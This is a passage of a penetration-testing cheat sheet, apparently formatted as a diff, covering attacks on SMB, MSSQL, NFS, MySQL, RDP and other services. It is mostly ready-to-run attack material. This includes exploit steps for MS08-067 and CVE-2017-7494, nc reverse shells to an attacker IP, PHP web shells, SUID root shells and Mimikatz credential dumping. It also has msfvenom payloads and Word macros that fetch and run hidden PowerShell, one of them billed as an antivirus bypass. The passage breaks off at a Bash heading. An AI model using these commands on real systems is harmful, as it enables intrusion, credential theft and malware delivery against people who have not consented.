+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Download exploit code
+git clone https://github.com/andyacer/ms08_067.git
+
+# Generate payload
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+msfvenom -p windows/shell_bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+
+# Modify
+Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.
+
+# Listener
+nc -lvp &lt;PORT&gt;
+
+# Exploit
+python ms08_067_2018.py &lt;IP&gt; &lt;NUMBER&gt; 445
+</code></pre></div></div>
+
+<h3 id="cve-2017-7494">CVE-2017-7494</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Version: 3.5.0 < 4.6.4, 4.5.10 and 4.4.14 is vulnerable to RCE
+  (check for local privesc: 
+    ps aux
+      root /usr/local/samba/sbin/smbd -D -s /smb.conf
+    /usr/local/samba/sbin/smbd -V
+      Version 3.5.0 < 4.6.4, 4.5.10, 4.4.14
+
+  #exploit: ssh -L 445:127.0.0.1:445 user@ip 
+    then exploit as below as rhost 127.0.0.1
+  )
+# Download exploit code
+git clone https://github.com/joxeankoret/CVE-2017-7494
+(Seem works only with SMB1)
+  Other SMB (i.e: RubySMB):
+    msfconsole
+    use exploit/linux/samba/is_known_pipename
+    set RHOSTS &lt;ip>
+    set RPORT &lt;445/139>
+    set SMB::AlwaysEncrypt false
+    set SMB::ProtocolVersion 1
+    run
+</code></pre></div></div>
+
+<p>Create a new file named poc.c :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define _GNU_SOURCE
+#include &lt;unistd.h>
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int samba_init_module(void)
+{
+	setresuid(0,0,0);
+	system("ping -c 3 &lt;IP&gt;");
+}
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Build
+gcc -o test.so -shared poc.c -fPIC
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Start an ICMP listener
+sudo tcpdump -i &lt;INTERFACE&gt; icmp
+
+# Exploit
+./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.so
+</code></pre></div></div>
+
+<p>If you reiceve 3 pings on your listener then the exploit works. Now let’s get a shell :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define _GNU_SOURCE
+#include &lt;unistd.h>
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int samba_init_module(void)
+{
+	setresuid(0,0,0);
+	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f");
+}
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Build
+gcc -o test.so -shared poc.c -fPIC
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Start a listener
+nc -lvp &lt;PORT&gt;
+
+# Exploit
+./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.so
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="mssql---1433">MSSQL - 1433</h2>
+
+<h3 id="get-information">Get information</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;
+</code></pre></div></div>
+
+<h3 id="brute-force-5">Brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; mssql -vV -I -u
+</code></pre></div></div>
+
+<h3 id="having-credentials">Having credentials</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mssqlclient.py -windows-auth &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
+mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
+
+# Once logged in you can run queries:
+SQL&gt; select @@ version;
+
+# Steal NTLM hash
+sudo smbserver.py -smb2support liodeus .
+SQL&gt; exec master..xp_dirtree '\\&lt;IP&gt;\liodeus\' # Steal the NTLM hash, crack it with john or hashcat
+
+# Try to enable code execution
+SQL&gt; enable_xp_cmdshell
+
+# Execute code
+SQL&gt; xp_cmdshell whoami /all
+SQL&gt; xp_cmdshell certutil.exe -urlcache -split -f http://&lt;IP&gt;/nc.exe
+OR
+xp_cmdshell powershell.exe wget http://192.168.119.227:8000/nc64.exe -OutFile c:\\Users\\Public\\nc.exe
+xp_cmdshell c:\\Users\\Public\\nc.exe -e cmd.exe 192.168.119.227 4444
+</code></pre></div></div>
+
+<h3 id="manual-exploit">Manual exploit</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cheatsheet :
+	- https://www.asafety.fr/mssql-injection-cheat-sheet/
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="nfs---2049">NFS - 2049</h2>
+
+<h3 id="show-mountable-nfs-shares">Show Mountable NFS Shares</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>showmount -e &lt;IP&gt;
+nmap --script=nfs-showmount -oN mountable_shares &lt;IP&gt;
+</code></pre></div></div>
+
+<h3 id="mount-a-share">Mount a share</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
+sudo mount -v -t nfs -o vers=2 &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
+</code></pre></div></div>
+
+<h3 id="nfs-misconfigurations">NFS misconfigurations</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># List exported shares
+cat /etc/exports
+</code></pre></div></div>
+
+<p>If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker, as root user(use commands below with sudo)
+mkdir &lt;DIRECTORY&gt;
+mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
+  (In case tunneling:
+    nmap to find nfs service port (i.e 2049)
+    #use for special case below
+  )
+cd &lt;DIRECTORY&gt;
+
+###
+echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' &gt; pwn.c
+gcc pwn.c -o pwn
+chmod +s pwn
+###
+OR
+wget https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash?raw=true -O /tmp/shell
+cp /tmp/shell .
+chmod +s shell
+
+# Victim
+
+cd &lt;SHARE&gt;
+./pwn # Root shell
+
+# Umount when the server is gone
+echo 'sudo umount -f -l mount' > test.sh
+chmod +x test.sh
+./test.sh
+
+# <strong>Special case:</strong>
+  ex: cat /etc/exports
+  /srv/Share 10.1.1.0/24(insecure,rw)
+  /srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)
+
+  This only allow indicated ip (127.0.0.1) mount with root permission
+  -> SSH tunneling: 
+      ssh -L 2049:127.0.0.1:2049 sean@10.11.1.251 (just in case for pivoting)
+      ssh -L 2049:127.0.0.1:2049 megan@10.1.1.27
+  -> sudo mount -v -t nfs -o port=2049 127.0.0.1:/srv/Share /mnt/share
+  -> continue as above: copy suid shell to /mnt/share (use cp command with root permission)
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="mysql---3306">MYSQL - 3306</h2>
+
+<h3 id="brute-force-6">Brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; mysql -vV -I -u -t 40
+#default username: root
+</code></pre></div></div>
+
+<h3 id="extracting-mysql-credentials-from-files">Extracting MySQL credentials from files</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/mysql/debian.cnf
+grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
+</code></pre></div></div>
+
+<h3 id="connect">Connect</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Local
+mysql -u &lt;USER&gt;
+mysql -u &lt;USER&gt; -p
+
+# Remote
+mysql -h &lt;IP&gt; -u &lt;USER&gt;
+</code></pre></div></div>
+
+<h3 id="mysql-commands">MySQL commands</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show databases;
+use &lt;DATABASES&gt;;
+
+show tables;
+describe &lt;TABLE&gt;;
+
+select * from &lt;TABLE&gt;;
+
+# Try to execute code
+select do_system('id');
+\! sh
+
+# Read &amp; Write
+select load_file('&lt;FILE&gt;');
+select 1,2,"&lt;?php echo shell_exec($_GET['c']);?&gt;",4 into OUTFILE '&lt;OUT_FILE&gt;'
+i.e: select '&lt;?php $cmd=$_GET["cmd"];system($cmd);?&gt;' INTO OUTFILE '/var/www/html/shell.php';
+</code></pre></div></div>
+
+<h3 id="manual-exploit-1">Manual exploit</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cheatsheet :
+	- https://www.asafety.fr/mysql-injection-cheat-sheet/
+Mysql hash dump:
+  nmap -p 3306 &lt;ip&gt; --script mysql-dump-hashes --script-args='username=root,password=secret'
+  msfconsole
+  use auxiliary/scanner/mysql/mysql_hashdump
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="rdp---3389">RDP - 3389</h2>
+
+<h3 id="brute-force-7">Brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crowbar -b rdp -s &lt;IP&gt;/CIDR -u &lt;USER&gt; -C &lt;PASSWORDS_LIST&gt;
+crowbar -b rdp -s &lt;IP&gt;/CIDR -U &lt;USERS_LIST&gt; -C &lt;PASSWORDS_LIST&gt;
+
+hydra -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; rdp://&lt;IP&gt; -u -vV
+</code></pre></div></div>
+
+<h3 id="connect-with-known-credentials--hash">Connect with known credentials / hash</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop -u &lt;USERNAME&gt; &lt;IP&gt;
+rdesktop -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;IP&gt;
+
+xfreerdp /u:[DOMAIN\]&lt;USERNAME&gt; /p:&lt;PASSWORD&gt; /v:&lt;IP&gt;
+xfreerdp /u:[DOMAIN\]&lt;USERNAME&gt; /pth:&lt;HASH&gt; /v:&lt;IP&gt;
+
+xfreerdp /u:admin /p:password /cert:ignore /v:10.10.141.112 /workarea
+</code></pre></div></div>
+
+<h3 id="session-stealing">Session stealing</h3>
+
+<h4 id="get-openned-sessions">Get openned sessions</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>query user
+</code></pre></div></div>
+
+<h4 id="access-to-the-selected">Access to the selected</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;
+</code></pre></div></div>
+
+<h3 id="adding-user-to-rdp-group-windows">Adding user to RDP group (Windows)</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup "Remote Desktop Users" &lt;USER&gt; /add
+#Add new user:
+net user USERNAME PASSWORD /add
+</code></pre></div></div>
+
+<hr>
+<h2 id="smtp---4555">SMTP - 4555</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Apache James Server 2.3.2 - https://www.exploit-db.com/exploits/50347
+nc &lt;ip> 4555
+#Login id:
+root
+#Password
+root
+#Welcome
+help
+setpassword [username] [password]
+
+#After set password
+<a href="#read-mail">Telnet to read mail</a>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Version: Postfix smtpd (search smtp postfix exploit)
+https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
+python postfix-shellshock-nc.py 10.11.1.231 useradm@mail.local IP PORT
+
+#https://www.exploit-db.com/exploits/34896
+</code></pre></div></div>
+
+<hr>
+<h2 id="vnc---5800---58001---5900---5901">VNC - 5800 - 58001 - 5900 - 5901</h2>
+
+<h3 id="scans-1">Scans</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p &lt;PORT&gt; &lt;IP&gt;
+</code></pre></div></div>
+
+<h3 id="brute-force-8">Brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;USERS_LIST&gt; –P &lt;PASSWORDS_LIST&gt; -s &lt;PORT&gt; &lt;IP&gt; vnc -u -vV
+</code></pre></div></div>
+
+<h3 id="connect-1">Connect</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vncviewer &lt;IP&gt;:&lt;PORT&gt;
+</code></pre></div></div>
+
+<h3 id="found-vnc-password">Found VNC password</h3>
+
+<h4 id="linux">Linux</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Default password is stored in: ~/.vnc/passwd
+</code></pre></div></div>
+
+<h4 id="windows">Windows</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># RealVNC
+HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
+
+# TightVNC
+HKEY_CURRENT_USER\Software\TightVNC\Server
+
+# TigerVNC
+HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
+
+# UltraVNC
+C:\Program Files\UltraVNC\ultravnc.ini
+</code></pre></div></div>
+
+<h3 id="decrypt-vnc-password">Decrypt VNC password</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+irb
+fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+require 'rex/proto/rfb'
+Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
+/dev/nul
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="winrm---5985---5986">WINRM - 5985 - 5986</h2>
+
+<h3 id="brute-force-9">Brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
+</code></pre></div></div>
+
+<h3 id="connecting">Connecting</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
+evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;HASH&gt;
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="cgi">CGI</h2>
+
+<h3 id="found-cgi-scripts">Found CGI scripts</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u &lt;URL&gt;/ccgi-bin/FUZZ -t 50
+ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGIs.txt -u &lt;URL&gt;/ccgi-bin/FUZZ -t 50
+ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u &lt;URL&gt;/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
+
+ffuf -w ~/Workspace/THM/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.11.1.71/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 50
+</code></pre></div></div>
+
+<p>If a script is found try <a href="#shellshock">SHELLSHOCK</a>.</p>
+
+<hr>
+
+<h2 id="command-and-control-framework">Command and control framework</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Download
+git clone https://github.com/mhaskar/Octopus/tree/v1.2
+
+# Install requirements
+pip install -r requirements.txt
+
+# Usage
+./octopus.py
+
+# Listener (exemple)
+listen_http &lt;BIND_IP&gt; &lt;BIND_PORT&gt; &lt;HOSTNAME&gt; &lt;INTERVAL_IN_SECONDS&gt; &lt;URL&gt; &lt;LISTENER_NAME&gt;
+listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1
+
+# Agent (exemple)
+generate_powershell &lt;LISTENER_NAME&gt;
+generate_powershell listener_1
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="compiling-exploits">Compiling exploits</h2>
+
+<h3 id="for-linux">For linux</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 64 bits
+gcc -o exploit exploit.c
+
+# 32 bits
+gcc -m32 -o exploit exploit.c
+</code></pre></div></div>
+
+<h3 id="for-windows">For windows</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To compile Win32 bit executables, execute i686-w64-mingw32-gcc -o &lt;FILE.exe&gt; &lt;FILE.c&gt;
+To compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o &lt;FILE.exe&gt;&lt;FILE.c&gt;
+To Compiled .cpp source file, execute i586-mingw32msvc-g++ -o &lt;FILE&gt;.exe &lt;FILE&gt;.cpp
+To compile python scripts, pyinstaller --onefile &lt;SCRIPT.py&gt;
+
+# Compile windows .exe on Linux
+i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
+</code></pre></div></div>
+
+<h3 id="cross-compile">Cross compile</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="dictionary-generation">DICTIONARY GENERATION</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl -m &lt;WORDS_SIZE&gt; --with-numbers -w dictiFromWebsite &lt;URL&gt; -d &lt;DEPTH&gt;
+john --wordlist=./dictiFromWebsite.txt --rules --stdout > passwords-mutated.txt
+
+echo '$!' > append_exclamation.rule
+hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule -r append_exclamation.rule > passlist.txt
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt
+crunch 4 4 0123456789 -o numbers.txt
+crunch 5 5 -t john% -o users.txt
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="file-transfer">FILE TRANSFER</h2>
+
+<h3 id="linux-1">Linux</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># PYTHON
+python -m SimpleHTTPServer &lt;PORT&gt;
+python2.7 -c "from urllib import urlretrieve; urlretrieve('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')"
+
+# FTP
+sudo python3 -m pyftpdlib  -p 21 -w
+
+# SMB
+sudo smbserver.py -smb2support liodeus .
+
+# WGET
+wget &lt;URL&gt; -o &lt;OUT_FILE&gt;
+
+# CURL
+curl &lt;URL&gt; -o &lt;OUT_FILE&gt;
+
+# NETCAT
+nc -lvp 1234 &gt; &lt;OUT_FILE&gt; 
+nc &lt;IP&gt; 1234 &lt; &lt;IN_FILE&gt; 
+
+# SCP
+scp &lt;SOURCE_FILE&gt; &lt;USER&gt;@&lt;IP&gt;:&lt;DESTINATION_FILE&gt;
+</code></pre></div></div>
+
+<h3 id="windows-1">Windows</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># FTP 
+#Attacker
+  service vsftpd start
+  (add file here: /srv/ftp)
+#Victim
+echo open &lt;IP&gt; 21 &gt; ftp.txt && echo USER anonymous &gt;&gt; ftp.txt && echo: &gt;&gt; ftp.txt && echo binary &gt;&gt; ftp.txt && echo GET nc.exe &gt;&gt; ftp.txt && echo bye &gt;&gt; ftp.txt
+ftp -v -n -s:ftp.txt
+#Attacker
+  service vsftpd stop
+  
+(#)
+open IP 21
+USER anonymous
+
+binary 
+GET nc.exe 
+bye
+
+# SMB
+(Kali) sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+(Windows) copy \\10.11.61.135\kali\reverse.exe C:\PrivEsc\reverse.exe
+  #Reverse shell without copying
+  \\10.11.61.135\kali\nc.exe 10.11.61.135 4444 -e cmd
+
+copy \\&lt;IP&gt;\&lt;(USER?)PATH&gt;\&lt;FILE&gt; # Linux -&gt; Windows
+copy &lt;FILE&gt; \\&lt;IP&gt;\&lt;PATH&gt;\ # Windows -&gt; Linux
+
+# Powershell
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('&lt;URL&gt;')
+powershell "wget &lt;URL&gt;"
+powershell.exe Invoke-WebRequest -Uri http://10.11.61.135:9000/nc64.exe -OutFile ./nc.exe
+
+# Python
+python.exe -c "from urllib import urlretrieve; urlretrieve('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')"
+
+# CertUtil
+certutil.exe -urlcache -split -f "&lt;URL&gt;"
+
+# NETCAT
+nc -lvp 1234 &gt; &lt;OUT_FILE&gt; 
+nc &lt;IP&gt; 1234 &lt; &lt;IN_FILE&gt;
+
+# CURL
+curl &lt;URL&gt; -o &lt;OUT_FILE&gt;
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="git">GIT</h2>
+
+<h3 id="download-git">Download .git</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir &lt;DESTINATION_FOLDER&gt;
+./gitdumper.sh &lt;URL&gt;/.git/ &lt;DESTINATION_FOLDER&gt;
+</code></pre></div></div>
+
+<h3 id="extract-git-content">Extract .git content</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir &lt;EXTRACT_FOLDER&gt;
+./extractor.sh &lt;DESTINATION_FOLDER&gt; &lt;EXTRACT_FOLDER&gt;
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="hashes">HASHES</h2>
+
+<h3 id="windows-2">Windows</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save HKLM\SAM c:\SAM
+reg save HKLM\System c:\System
+
+samdump2 System SAM &gt; hashes
+(The above seems not work, use this: python3 /usr/share/creddump7/pwdump.py SYSTEM SAM)
+</code></pre></div></div>
+
+<h3 id="linux-2">Linux</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow passwd shadow &gt; hashes
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="mimikatz">MIMIKATZ</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
+/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::logonpasswords
+sekurlsa::tickets /export
+
+kerberos::list /export
+
+vault::cred
+vault::list
+
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="miscellaneous">MISCELLANEOUS</h2>
+
+<h3 id="get-a-windows-path-without-spaces">Get a Windows path without spaces</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># path.cmd
+@echo off
+echo %~s1
+
+path.cmd "C:\Program Files (x86)\Common Files\test.txt"
+C:\PROGRA~2\COMMON~1\test.txt -&gt; Valid path without spaces
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="msfvenom-payload">MSFVENOM PAYLOAD</h2>
+
+<h3 id="linux-3">Linux</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell.elf
+</code></pre></div></div>
+
+<h3 id="windows-3">Windows</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.61.135 LPORT=4444 -f dll -o not_malicious.dll
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.227 LPORT=80 -f hta-psh -o evil.hta
+
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Microsoft Word Macro
+  Create Doc1.doc (.docm)
+  View -> Macro: Create MyMacro
+    Sub AutoOpen()
+        MyMacro
+    End Sub
+
+    Sub Document_Open()
+        MyMacro
+    End Sub
+
+    Sub MyMacro()
+        Dim Str As String
+        
+        Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
+        Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
+        Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
+        ...
+        Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
+        Str = Str + "QA="
+
+        CreateObject("Wscript.Shell").Run Str
+    End Sub
+
+  #Get base64 encoded payload from: cat evil.hta
+    python script.py:
+      str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
+      n = 50
+      for i in range(0, len(str), n):
+        print "Str = Str + " + '"' + str[i:i+n] + '"'
+</code></pre></div></div>
+<h4 id="rs-av-bypass">ReverseShell AV bypass (Word Macro)</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+#Windows Defender bypass RS: https://github.com/tihanyin/PSSW100AVB
+
+Sub AutoOpen()
+    chapel
+End Sub
+Sub Document_Open()
+    chapel
+End Sub
+Sub chapel()
+    Dim strProgramName As String
+    Dim strArgument As String
+    Set doc = ActiveDocument
+    strProgramName = doc.BuiltInDocumentProperties("Subject").Value
+    strArgument = "/c curl -s http://192.168.0.105:8000/updaterRS.ps1 --output %temp%\updaterRS.ps1 && powershell.exe -NoP -NonI -W Hidden -Exec Bypass %temp%\updaterRS.ps1 6.tcp.ngrok.io 17761"
+    Call Shell("""" & strProgramName & """ """ & strArgument & """", vbHideFocus)
+End Sub
+</code></pre></div></div>
+
+<h3 id="php">PHP</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php
+
+Then we need to add the &lt;?php at the first line of the file so that it will execute as a PHP webpage
+cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
+</code></pre></div></div>
+
+<h3 id="asp">ASP</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp
+</code></pre></div></div>
+
+<h3 id="jsp">JSP</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp
+</code></pre></div></div>
+
+<h3 id="war">WAR</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war
+</code></pre></div></div>
+
+<h3 id="python">Python</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.py
+</code></pre></div></div>
+
+<h3 id="bash">Bash</h3>
+
